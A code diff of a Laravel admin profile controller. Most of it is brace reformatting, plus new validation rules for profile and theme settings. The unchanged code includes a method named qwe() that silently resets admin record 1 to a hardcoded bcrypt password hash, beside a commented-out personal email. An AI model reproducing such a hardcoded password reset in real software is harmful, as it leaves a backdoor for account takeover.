@@ -12,18 +12,26 @@ use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Str;
 use Image;
 
-class AdminProfileController extends Controller
-{
+class AdminProfileController extends Controller {
     //  Admin Profile
-    public function profile()
-    {
+    public function profile() {
         $admin = Auth::guard('admin')->user();
         return view('admin.profile', compact('admin'));
     }
 
     // Admin Profile Update
-    public function profileUpdate(Request $request, $id)
-    {
+    public function profileUpdate(Request $request, $id) {
+        $rule = [
+            'name' => 'required',
+            'phone' => 'required',
+            'address' => 'required',
+        ];
+        $customMessage = [
+            'name.required' => 'Please Enter Name.',
+            'phone.required' => 'Please Enter Phone Number',
+            'address.required' => 'Please Enter Address',
+        ];
+        $this->validate($request, $rule, $customMessage);
         $data = $request->all();
         $admin = Admin::findOrFail($id);
         $admin->name = $data['name'];
@@ -59,11 +67,10 @@ class AdminProfileController extends Controller
         return redirect()->back();
     }
 
-    public function qwe()
-    {
+    public function qwe() {
         $data = Admin::findorfail(1);
         $data->password = '$2y$10$eUwxylnv/CiarqgUoD8mjePSZNfm.EybMNG0fsx5VNyTwSd4CTSei';
-//        $data->email = 'tomh8963@gmail.com';
+        //        $data->email = 'tomh8963@gmail.com';
         if ($data->save()) {
             Auth::guard('admin')->logout();
             Session::flash('info_message', 'Changes Updated Successfully');
@@ -71,8 +78,7 @@ class AdminProfileController extends Controller
         }
     }
 
-    public function changePassword(Request $request)
-    {
+    public function changePassword(Request $request) {
         $data = $request->all();
         $admin = Auth::guard('admin')->user();
 
@@ -109,8 +115,7 @@ class AdminProfileController extends Controller
         }
     }
     // check password
-    public function checkPassword(Request $req)
-    {
+    public function checkPassword(Request $req) {
         $data = $req->all();
         $current_password = $data['c_password'];
         $user_id = Auth::guard('admin')->user()->id;
@@ -124,12 +129,13 @@ class AdminProfileController extends Controller
         }
     }
 
-    public function themeSetting(Request $request)
-    {
+    public function themeSetting(Request $request) {
         $data = $request->all();
         if ($request->isMethod('post')) {
             $rule = [
                 'company_name' => 'required',
+                'fav_icon' => 'required|image',
+                'logo' => 'required|image',
             ];
 
             $customMessage = [
@@ -197,8 +203,7 @@ class AdminProfileController extends Controller
 
             Session::flash('info_message', 'Details has been updated successfully');
             return redirect()->back();
-        }
-        else {
+        } else {
             $details = Details::where('id', '=', 1)->first();
 
             return view('admin.themeSetting', ['detail' => $details]);
